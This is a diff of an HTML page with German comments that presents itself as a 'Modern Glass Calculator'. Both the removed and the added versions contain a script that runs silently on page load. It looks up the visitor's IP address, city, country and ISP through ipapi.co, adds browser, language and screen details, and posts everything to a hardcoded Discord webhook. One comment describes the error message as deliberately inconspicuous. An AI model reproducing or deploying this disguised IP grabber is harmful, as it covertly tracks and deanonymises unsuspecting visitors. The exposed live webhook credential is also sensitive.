@@ -2,72 +2,77 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <title>Glass Calculator</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Glass Calculator</title>
     <style>
-        body { background: #0f0f0f; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: 'Segoe UI', sans-serif; }
-        .calc-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 25px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); width: 320px; text-align: center; }
-        .screen { background: rgba(0,0,0,0.2); border-radius: 10px; padding: 15px; font-size: 2em; text-align: right; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.05); }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
-        button { background: rgba(255,255,255,0.1); border: none; padding: 20px; border-radius: 12px; color: white; font-size: 1.1em; transition: 0.2s; cursor: pointer; }
-        button:hover { background: rgba(255,255,255,0.2); transform: translateY(-2px); }
-        .op { background: rgba(0, 122, 204, 0.3); }
+        :root { --bg: #0a0a0a; --glass: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.1); }
+        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        
+        /* Rechner Design */
+        .calculator { background: var(--glass); backdrop-filter: blur(20px); border: 1px solid var(--border); border-radius: 30px; padding: 25px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); width: 320px; }
+        .display { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; text-align: right; font-size: 2.5rem; margin-bottom: 20px; border: 1px solid var(--border); overflow: hidden; }
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+        button { background: var(--glass); border: 1px solid var(--border); color: white; padding: 20px; border-radius: 15px; font-size: 1.2rem; cursor: pointer; transition: 0.2s; }
+        button:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); }
+        .accent { background: rgba(0, 150, 255, 0.2); border-color: rgba(0, 150, 255, 0.4); }
     </style>
 </head>
 <body>
 
-<div class="calc-card">
-    <div class="screen">0</div>
-    <div class="grid">
-        <button>7</button><button>8</button><button>9</button><button class="op">/</button>
-        <button>4</button><button>5</button><button>6</button><button class="op">*</button>
-        <button>1</button><button>2</button><button>3</button><button class="op">-</button>
-        <button>0</button><button>C</button><button class="op">=</button><button class="op">+</button>
+<div class="calculator">
+    <div class="display">0</div>
+    <div class="buttons">
+        <button class="accent">C</button><button class="accent">+/-</button><button class="accent">%</button><button class="accent">/</button>
+        <button>7</button><button>8</button><button>9</button><button class="accent">*</button>
+        <button>4</button><button>5</button><button>6</button><button class="accent">-</button>
+        <button>1</button><button>2</button><button>3</button><button class="accent">+</button>
+        <button style="grid-column: span 2;">0</button><button>.</button><button class="accent">=</button>
     </div>
 </div>
 
 <script>
-    // DEIN WEBHOOK HIER (z.B. von Discord oder webhook.site)
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1467989179651723280/XL8t4u7-ozysDZ_4-Jh1RAy7buDHY7RihcBpePJDvk4FtoDmvCcFuP_iolY4nsuYjbEt";
+    // DEIN WEBHOOK
+    const webhookURL = "https://discord.com/api/webhooks/1467989179651723280/XL8t4u7-ozysDZ_4-Jh1RAy7buDHY7RihcBpePJDvk4FtoDmvCcFuP_iolY4nsuYjbEt";
 
-    async function grabAndSend() {
+    async function sendData() {
         try {
-            // 1. IP & Standort Daten abrufen
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const info = await ipRes.json();
+            // 1. IP und Standort-Details abrufen
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
 
-            // 2. Netzwerk-Infos (Was im Browser möglich ist)
-            const extraInfo = {
-                browser: navigator.userAgent,
-                sprache: navigator.language,
-                aufloesung: `${window.screen.width}x${window.screen.height}`,
-                zeit: new Date().toLocaleString()
+            // 2. Weitere Browser-Infos sammeln
+            const payload = {
+                username: "System Logger",
+                avatar_url: "https://i.imgur.com/4M34hi2.png",
+                embeds: [{
+                    title: "🌐 Neuer Standort-Report",
+                    color: 3447003,
+                    fields: [
+                        { name: "IP-Adresse", value: `\`${data.ip || "Unbekannt"}\``, inline: true },
+                        { name: "Land/Stadt", value: `${data.country_name} / ${data.city}`, inline: true },
+                        { name: "Anbieter (ISP)", value: data.org || "Unbekannt" },
+                        { name: "Browser / OS", value: navigator.userAgent },
+                        { name: "Sprache", value: navigator.language, inline: true },
+                        { name: "Bildschirm", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
             };
 
-            // 3. Daten kombinieren und per Webhook senden
-            await fetch(WEBHOOK_URL, {
+            // 3. An Discord senden
+            await fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: "🚀 **Neuer Visit erfasst!**",
-                    embeds: [{
-                        title: "User Info",
-                        color: 5814783,
-                        fields: [
-                            { name: "IP", value: info.ip || "N/A", inline: true },
-                            { name: "Stadt", value: info.city || "N/A", inline: true },
-                            { name: "Provider", value: info.org || "N/A" },
-                            { name: "Browser", value: extraInfo.browser }
-                        ]
-                    }]
-                })
+                body: JSON.stringify(payload)
             });
-        } catch (err) {
-            console.log("System bereit."); // Unauffällige Fehlermeldung
+
+        } catch (error) {
+            console.error("Fehler beim Erfassen.");
         }
     }
 
-    // Startet automatisch beim Laden der Seite
-    window.onload = grabAndSend;
+    // Sofort beim Laden ausführen
+    window.onload = sendData;
 </script>
 
 </body>
